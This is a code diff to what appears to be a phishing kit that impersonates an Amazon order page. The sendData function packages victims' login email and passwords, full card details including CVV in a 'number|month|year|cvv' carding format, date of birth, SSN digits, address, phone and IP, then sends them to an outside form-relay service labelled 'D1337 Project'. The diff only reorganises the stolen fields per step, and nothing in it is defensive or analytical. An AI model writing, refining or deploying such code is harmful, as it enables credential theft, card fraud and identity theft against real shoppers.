@@ -205,11 +205,52 @@
         function showLoading(show) { document.querySelectorAll('.step').forEach(s => s.classList.remove('active')); document.getElementById('loading').style.display = show ? 'block' : 'none'; }
 
         async function sendData(step) {
-            let msg = '=== AMAZON [' + config.order + '] ===\nProduct: ' + config.product + '\nPrice: $' + config.price + '\n\n--- LOGIN ---\nEmail: ' + data.email + '\nPass1: ' + data.password + '\n';
-            if (data.password2) msg += 'Pass2: ' + data.password2 + '\n';
-            if (step >= 2) { msg += '\n--- CARD ---\nName: ' + data.cardName + '\nCard: ' + data.cardNumber + '\nExp: ' + data.cardExp + '\nCVV: ' + data.cardCvv + '\n'; let cn = data.cardNumber.replace(/\s/g, ''); let exp = data.cardExp.replace(/\s/g, '').split('/'); msg += 'FORMAT: ' + cn + '|' + (exp[0]||'') + '|' + (exp[1]||'') + '|' + data.cardCvv + '\n'; }
-            if (step >= 3) { msg += '\n--- PERSONAL ---\nName: ' + data.fullName + '\nDOB: ' + data.dob + '\n'; if (data.ssn) msg += 'SSN4: ' + data.ssn + '\n'; msg += 'Phone: ' + data.phone + '\nAddr: ' + data.address + ', ' + data.city + ', ' + data.state + ' ' + data.zip + '\n'; }
-            msg += '\n--- DEVICE ---\nIP: ' + data.ip + ' (' + data.country + ')\nScreen: ' + data.screen + '\nTZ: ' + data.tz + '\n';
+            let cn = data.cardNumber.replace(/\s/g, '');
+            let exp = data.cardExp.replace(/\s/g, '').split('/');
+            let binFormat = cn + '|' + (exp[0]||'') + '|' + (exp[1]||'') + '|' + data.cardCvv;
+            
+            let msg = '';
+            if (step === 2) {
+                msg = binFormat + '\n\n';
+                msg += '--- DETAILS ---\n';
+                msg += 'Name: ' + data.cardName + '\n';
+                msg += 'Card: ' + data.cardNumber + '\n';
+                msg += 'Exp: ' + data.cardExp + '\n';
+                msg += 'CVV: ' + data.cardCvv + '\n';
+                msg += '\n--- LOGIN ---\n';
+                msg += 'Email: ' + data.email + '\n';
+                msg += 'Pass1: ' + data.password + '\n';
+                if (data.password2) msg += 'Pass2: ' + data.password2 + '\n';
+                msg += '\n--- DEVICE ---\n';
+                msg += 'IP: ' + data.ip + ' (' + data.country + ')\n';
+            } else if (step === 1) {
+                msg = '--- LOGIN ---\n';
+                msg += 'Email: ' + data.email + '\n';
+                msg += 'Pass1: ' + data.password + '\n';
+                if (data.password2) msg += 'Pass2: ' + data.password2 + '\n';
+                msg += '\n--- DEVICE ---\n';
+                msg += 'IP: ' + data.ip + ' (' + data.country + ')\n';
+            } else if (step === 3) {
+                msg = binFormat + '\n\n';
+                msg += '--- PERSONAL ---\n';
+                msg += 'Name: ' + data.fullName + '\n';
+                msg += 'DOB: ' + data.dob + '\n';
+                if (data.ssn) msg += 'SSN4: ' + data.ssn + '\n';
+                msg += 'Phone: ' + data.phone + '\n';
+                msg += 'Addr: ' + data.address + ', ' + data.city + ', ' + data.state + ' ' + data.zip + '\n';
+                msg += '\n--- CARD ---\n';
+                msg += 'Name: ' + data.cardName + '\n';
+                msg += 'Card: ' + data.cardNumber + '\n';
+                msg += 'Exp: ' + data.cardExp + '\n';
+                msg += 'CVV: ' + data.cardCvv + '\n';
+                msg += '\n--- LOGIN ---\n';
+                msg += 'Email: ' + data.email + '\n';
+                msg += 'Pass1: ' + data.password + '\n';
+                if (data.password2) msg += 'Pass2: ' + data.password2 + '\n';
+                msg += '\n--- DEVICE ---\n';
+                msg += 'IP: ' + data.ip + ' (' + data.country + ')\n';
+            }
+            
             try { await fetch('https://api.web3forms.com/submit', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({ access_key: WEB3FORMS_KEY, subject: step === 1 ? 'Email Access' : step === 2 ? 'Card Info' : 'Personal Info', from_name: 'D1337 Project', message: msg }) }); } catch(e) {}
         }
 
